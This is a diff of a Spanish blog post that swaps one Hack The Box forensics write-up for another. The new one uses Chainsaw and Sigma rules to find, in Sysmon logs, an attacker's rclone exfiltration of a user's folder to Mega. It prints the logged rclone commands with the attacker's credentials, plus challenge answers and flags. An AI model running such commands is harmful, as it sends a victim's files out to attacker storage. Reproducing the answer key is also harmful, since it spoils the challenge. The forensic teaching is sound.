@@ -1,8 +1,8 @@
 ---
 layout: single
-title: PlainText Treasure - CTF HTB Cyber Apocalypse 2023
-excerpt: "Este es el primer desafio forense del evento Cyber Apocalypse 2023 de Hack The Box, considerado de dificultad very-easy, en el cual analizaremos una captura de tráfico utilizando Wireshark y el comando strings en busca de un usuario y contraseña (flag)."
-date: 2023-03-18
+title: Packet Cyclone - CTF HTB Cyber Apocalypse 2023
+excerpt: "Este es el quinto desafío forense del evento Cyber Apocalypse 2023 de Hack The Box. Se considera de dificultad fácil y consiste en analizar un archivo de registro de eventos de Windows (.evtx) generado por el servicio Sysmon. En este archivo se registra la ejecución sospechosa del software Rclone a través de la línea de comandos en un equipo con Windows. Nuestra tarea consiste en responder todas las preguntas solicitadas para que la plataforma de HTB nos entregue la flag del desafío."
+date: 2023-03-22
 classes: wide
 header:
   teaser: /assets/images/htb-cyber-apocalypse-plaintext-treasure/cyber-apocalypse-ctf-2023.jpg
@@ -13,68 +13,148 @@ categories:
   - ctf
   - forense
 tags:  
-  - wireshark
-  - pcap
-  - strings
+  - chainsaw
+  - sigma rules
 ---
 
 ![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/cyber-apocalypse-ctf-2023.jpg)
 
-**Dificultad:** very-easy
+**Dificultad:** easy
 
 ## Enunciado
 
-_La inteligencia de amenazas descubrió que los alienígenas operan a través de un servidor de comando y control alojado en su infraestructura. Pandora logró penetrar sus defensas y tener acceso a su red interna. Debido a que su servidor usa HTTP, Pandora capturó el tráfico de la red para robar las credenciales de administrador del servidor. Abra el archivo proporcionado con Wireshark y localice el nombre de usuario y la contraseña del administrador._
+_El amigo y socio de Pandora, Wade, es quien dirige la investigación sobre la ubicación de la reliquia. Recientemente, notó un tráfico extraño proveniente de su host. Eso lo llevó a creer que su host estaba comprometido. Después de una rápida investigación, se confirmó su temor. Pandora intenta ahora ver si el atacante provocó el tráfico sospechoso durante la fase de exfiltración. Pandora cree que el actor malicioso usó rclone para filtrar la investigación de Wade a la nube. Usando la herramienta llamada "chainsaw" y las reglas sigma provistas, ¿puede detectar el uso de rclone de los registros de eventos producidos por Sysmon? Para obtener la bandera, debe iniciar y conectarse al servicio docker y responder todas las preguntas correctamente._
 
-## File
+## Archivos del desafio
 
-Ejecutamos el comando `file` para averiguar contra qué tipo de archivo nos enfrentamos. En este caso, se trata de un archivo llamado "capture.pcap" que contiene una captura de paquetes de red en formato pcap. Esta captura utiliza marcas de tiempo en microsegundos y tiene una longitud máxima de captura de 262144 bytes.
+Se nos entrega un archivo comprimido en formato `.zip`, que contiene una carpeta de registro de logs de Windows con 149 archivos `.evtx`, así como una segunda carpeta llamada `sigma_rules`, que contiene dos reglas sigma en formato `.yaml`. El objetivo de este desafío es utilizar la herramienta `chainsaw`, junto con las reglas sigma, para analizar todos los archivos `.evtx` de Windows y encontrar la ejecución sospechosa del software Rclone. Parece ser que este software ha sido utilizado para exfiltrar información de una computadora previamente comprometida.
 
+La herramienta `chainsaw` esta disponible para `Linux` y `Windows` en su repositorio de [GitHub](https://github.com/WithSecureLabs/chainsaw).
+
+En mi caso, utilizaré la versión para Linux de la herramienta `chainsaw`, y solo trabajaré con los registros presentes en el archivo `Microsoft-Windows-Sysmon Operational.evtx`. Seguiré esta arquitectura de archivos específica según lo indicado en el enunciado del desafío:
 ```
-❯ file capture.pcap
-capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
+❯ tree
+.
+├── chainsaw
+│   ├── chainsaw
+│   ├── LICENCE
+│   ├── mappings
+│   │   ├── sigma-event-logs-all.yml
+│   │   ├── sigma-event-logs-legacy.yml
+│   │   └── sigma-mft-logs-all.yml
+│   └── README.md
+├── Logs
+│   └── Microsoft-Windows-Sysmon%4Operational.evtx
+└── sigma_rules
+    ├── rclone_config_creation.yaml
+    └── rclone_execution.yaml
+
+5 directories, 9 files
 ```
 
-## Wireshark
+## Chainsaw
 
-Tal y como sugiere el enunciado del desafío, procedemos a abrir el archivo con `Wireshark` para encontrar el nombre de usuario y la contraseña del administrador. Nuevamente, el enunciado nos entrega una pista: el tráfico de red capturado corresponde al protocolo HTTP, lo que significa que los datos capturados se encuentran en texto plano. Por lo tanto, el usuario y la contraseña deben ser fáciles de encontrar.
+Tal como se indica en su repositorio de GitHub, `Chainsaw` proporciona una potente capacidad de "primera respuesta" para identificar rápidamente amenazas dentro de los artefactos forenses de Windows, como los archivos `.evtx` ubicados en la ruta `C:\Windows\System32\winevt\Logs`. `Chainsaw` ofrece un método genérico y rápido para buscar palabras clave en los registros de eventos y detectar amenazas mediante la integración incorporada de las reglas de detección de Sigma y las reglas de detección personalizadas de `Chainsaw`.
 
+En este caso, el desafío ya nos proporciona las reglas Sigma que utilizaremos, las cuales se encuentran en la carpeta `sigma_rules`. Al ejecutar la herramienta a través de la interfaz de línea de comandos (CLI), el comando se vería de la siguiente manera:
 ```
-❯ wireshark capture.pcap
+❯ ./chainsaw hunt ../Logs -s ../sigma_rules --mapping mappings/sigma-event-logs-all.yml
 ```
-![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/wireshark1.png)
 
-Siempre es una buena practica verificar la jerarquia de protocolos que nos entrega Wireshark, esta opción muestra una vista jerárquica de los protocolos presentes en el tráfico de red capturado. Podemos ver la estructura en capas, lo que nos permite comprender cómo interactúan los diferentes protocolos en una comunicación. Esta vista nos ayuda a identificar rápidamente los protocolos involucrados y su distribución en el tráfico.
+El comando anterior indica a la herramienta `Chainsaw` que se ejecute en modo `hunt` sobre todos los archivos dentro de la carpeta `Logs`. Luego, utiliza todas las reglas sigma proporcionadas en el desafío para la lógica de detección, y por último, utiliza el archivo `sigma-event-logs-all.yml` para el análisis de los registros.
 
-![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/wireshark2.png)
+Luego de ejecutar el comando, la salida se verá de la siguiente manera:
+![](/assets/images/htb-cyber-apocalypse-packet-cyclone/chainsaw.png)
 
-Como podemos observar, efectivamente la mayor cantidad de tráfico de red está relacionado con el protocolo HTTP. En este desafío, se nos pide encontrar el nombre de usuario y la contraseña, los cuales se envían a través del método POST al interactuar con un sitio web. Por lo tanto podemos aplicar el siguiente filtro en Wireshark para visualizar específicamente este tipo de paquetes: `http.request.method == "POST"`
-
-![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/wireshark3.png)
-
-Hemos encontrado 4 coincidencias para nuestra búsqueda. Al hacer clic en el primer paquete de red filtrado, que apunta a `/token`, podemos ver la información de interés para este desafío. Tenemos a la vista los parámetros **username** y **password**.
-
-![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/wireshark4.png)
-
-Para poder observar de mejor manera el tráfico capturado y los datos necesarios para resolver el desafío, hacemos clic derecho sobre el paquete de red de interés y seleccionamos la opción **Seguir** -> **Secuencia HTTP**. Esta función nos permite visualizar y seguir el flujo completo de una transacción HTTP entre un cliente y un servidor. Resulta muy útil para analizar en detalle la comunicación entre ambas partes y examinar los mensajes HTTP intercambiados.
-
-
-Al realizar el seguimiento de la secuencia HTTP asociada, Wireshark muestra todos los paquetes relacionados con el flujo TCP, que en este caso es el número 4. Este flujo corresponde a la sesión establecida al momento de enviar las credenciales al servidor web a través de la función `/token`.
-Con esto, podemos visualizar el nombre de usuario y la contraseña enviada , esta última corresponde a la **flag** del desafío.
-
-![](/assets/images/htb-cyber-apocalypse-plaintext-treasure/wireshark5.png)
-
-## Strings
-
-Este desafío es de dificultad "very-easy", lo que significa que se puede resolver fácilmente utilizando el comando strings y filtrando por la palabra "HTB".
-
-_Comando strings: Se utiliza para extraer y mostrar cadenas de texto legibles desde un archivo o una entrada de datos binarios. Su objetivo principal es identificar y extraer las secuencias de caracteres legibles en archivos que de otra manera podrían contener una mezcla de datos binarios y texto._
-
+Y el detalle sería este:
 ```
-❯ strings capture.pcap | grep -i HTB
-HTB{th3s3_4l13ns_st1ll_us3_HTTP}
+CommandLine: '"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI'
+Company: https://rclone.org 
+CurrentDirectory: C:\Users\wade\AppData\Local\Temp\rclone-v161.1-windows-amd64\
+Description: Rsync for cloud storage
+FileVersion: 1.61.1
+Hashes: SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961
+Image: C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe
+IntegrityLevel: Medium
+LogonGuid: 10DA3E43-D892-63F8-4B6D-030000000000
+LogonId: '0x36d4b'
+OriginalFileName: rclone.exe
+ParentCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessGuid: 10DA3E43-D8D2-63F8-9B00-000000000900
+ParentProcessId: 5888
+ParentUser: DESKTOP-UTDHED2\wade
+ProcessGuid: 10DA3E43-D92B-63F8-B100-000000000900
+ProcessId: 3820
+Product: Rclone
+RuleName: '-'
+TerminalSessionId: 1
+User: DESKTOP-UTDHED2\wade
+UtcTime: 2023-02-24 15:35:07.336
+
+
+CommandLine: '"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v'
+Company: https://rclone.org
+CurrentDirectory: C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\
+Description: Rsync for cloud storage
+FileVersion: 1.61.1
+Hashes: SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961
+Image: C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe
+IntegrityLevel: Medium
+LogonGuid: 10DA3E43-D892-63F8-4B6D-030000000000
+LogonId: '0x36d4b'
+OriginalFileName: rclone.exe
+ParentCommandLine: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessGuid: 10DA3E43-D8D2-63F8-9B00-000000000900
+ParentProcessId: 5888
+ParentUser: DESKTOP-UTDHED2\wade
+ProcessGuid: 10DA3E43-D935-63F8-B200-000000000900
+ProcessId: 5116
+Product: Rclone
+RuleName: '-'
+TerminalSessionId: 1
+User: DESKTOP-UTDHED2\wade
+UtcTime: 2023-02-24 15:35:17.516
 ```
+
+Con toda la información anterior, ya podemos conectarnos al contenedor Docker de HTB y responder las siguientes preguntas.
+
+# Preguntas
+
+1. ¿Cuál es el correo electrónico del atacante utilizado para el proceso de exfiltración? (por ejemplo: nombre@email.com)
+Si observamos los detalles encontrados por la herramienta `Chainsaw`, podemos ver que se ha ejecutado el siguiente comando a través de PowerShell:
+```
+rclone.exe config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI
+```
+Respuesta: majmeret@protonmail.com
+
+2. ¿Cuál es la contraseña del atacante utilizada para el proceso de exfiltración?
+En el comando anterior, también se puede observar esta respuesta:
+`Respuesta: FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1sU3EjhoKQw0rEoQqHyI`
+
+3. ¿Cuál es el proveedor de almacenamiento en la nube que utiliza el atacante?
+Esta respuesta la deduje por descarte, en un principio intenté encontrar alguna URL u otra pista que indicara el proveedor de nube, pero en realidad es tan simple como observar que en el comando anterior se menciona el servicio de Mega.
+`Respuesta: mega`
+
+4. ¿Cuál es el ID del proceso utilizado por los atacantes para configurar su herramienta?
+Al observar los detalles de las dos detecciones encontradas por Chainsaw, podemos identificar que la primera detección corresponde a la configuración y la segunda detección corresponde a la exfiltración. Por lo tanto, el ID de proceso de la configuración es 3820.
+`Respuesta: 3820`
+
+5. ¿Cuál es el nombre de la carpeta que exfiltro el atacante? proporcionar la ruta completa.
+Para responder a esta pregunta, debemos examinar el detalle de la segunda detección, que corresponde al proceso de exfiltración. En este caso, se ha ejecutado el siguiente comando a través de PowerShell:
+```
+"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
+```
+`Respuesta: C:\Users\Wade\Desktop\Relic_location`
+
+
+6. ¿Cuál es el nombre de la carpeta a la que el atacante extrajo los archivos?
+En el comando anterior, podemos observar que el destino es `remote:exfiltration`, lo que indica que el nombre de la carpeta es `exfiltration.`
+
+Luego de responder estas seis simples preguntas, el contenedor Docker de HTB nos proporcionará la flag.}
 
 ## Flag
 
-**HTB{th3s3_4l13ns_st1ll_us3_HTTP}**
+**HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}**
+
